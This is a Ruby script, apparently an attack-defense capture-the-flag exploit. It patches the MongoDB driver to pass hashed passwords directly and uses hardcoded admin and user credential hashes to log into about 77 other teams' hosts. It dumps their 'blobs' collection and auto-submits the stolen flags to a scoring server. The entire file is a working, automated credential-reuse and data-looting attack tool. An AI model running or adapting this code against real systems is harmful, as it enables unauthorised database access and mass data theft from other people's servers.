#!/usr/bin/env ruby
require 'mongo'
require 'timeout'
require 'socket'
require 'yaml'

STDOUT.sync = 1
STDERR.sync = 1

OUR_HOST = "10.11.77.2"

module Mongo
  module Support
    def hash_password username, pass
      pass
    end
  end
end

def get_flags_admin host
  STDERR.print " (ADMIN) "
  db = Mongo::Connection.new(host).db("admin")
  begin
    db.authenticate 'admin','65421288ebf0922c3ffe4b3da9be5c3f'
  rescue Mongo::AuthenticationError
    return nil
  end

  db.connection.db('nfsv5').collection('blobs').find().map{ |x| x['data'] }
end

def get_flags_user host
  STDERR.print " (USER) "
  db = Mongo::Connection.new(host).db("nfsv5")
  begin
    db.authenticate 'nfs','92d64f9e81715a4159fad506e45a77d1'
  rescue Mongo::AuthenticationError
    puts "AUTH2:"
    db.authenticate 'nfs','3a75211be980547895dac0b6b1c3ec6b'
  rescue Mongo::AuthenticationError
    return nil
  end

  db.collection('blobs').find().map{ |x| x['data'] }
end

def get_flags host
  STDERR.print("[.] #{host} ... ")
  r = get_flags_admin(host) || get_flags_user(host)
  if r
    puts "#{r.size} flags"
    r
  else
    []
  end
end

#begin
#  @hflags = YAML::load_file('flags.yml')
#rescue
#  @hflags = {}
#end

@queue = {}

FINAL_RESPONSES = [
  "Unknown flag.",
  "Flag validity expired.",
  "You already submitted this flag.",
  "Congratulations, you scored a point!"
]

def known_flag?(flag)
  return true if flag.to_s.strip[/[^a-z0-9]/i]
  File.exist?("flags/#{flag}")
end

def save_flag flag, data
  File.open("flags/#{flag}","w"){ |f| f<<data }
end

def submit_flag flag
  unless @socket
    @socket = TCPSocket.open('10.11.0.1',1)
    @socket.gets
  end
  @socket.puts flag
  @socket.flush
  r = @socket.gets.to_s.strip
  if FINAL_RESPONSES.include?(r)
    puts r
    save_flag(flag,r)
    @queue.delete(flag)
  elsif r.empty?
    print "?"
    @socket = nil
    return false
  elsif r == "You do not have the corresponding service up (must be in state 'good')."
    @queue[flag] = 1
    puts "QUEUED: #{r}"
  else
    puts r
  end
  true
rescue
  @socket = nil
  p $!
  false
end

def submit_flags flags
  flags.each do |flag|
    next if known_flag?(flag)
    print "#{flag} .. "
    while true
      r = false
      begin
        Timeout::timeout(5) do
          r = submit_flag(flag)
        end
      rescue Timeout::Error
        print "t"
      end
      break if r
    end
  end
end


hosts = ARGV.map{ |x| "10.11.#{x}.2" }
if hosts.empty?
  a = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78]
  hosts = a.map{ |x| "10.11.#{x}.2" }.shuffle
end

while true do
hosts.each do |host|
  next if host == OUR_HOST
  flags = []
  begin
    Timeout::timeout(5) do
      flags = get_flags host
    end
  rescue
    STDERR.puts $!.inspect
  end
  if flags.any?
    submit_flags(flags)
  elsif @queue.any?
    submit_flags(@queue.keys)
  end
end
end
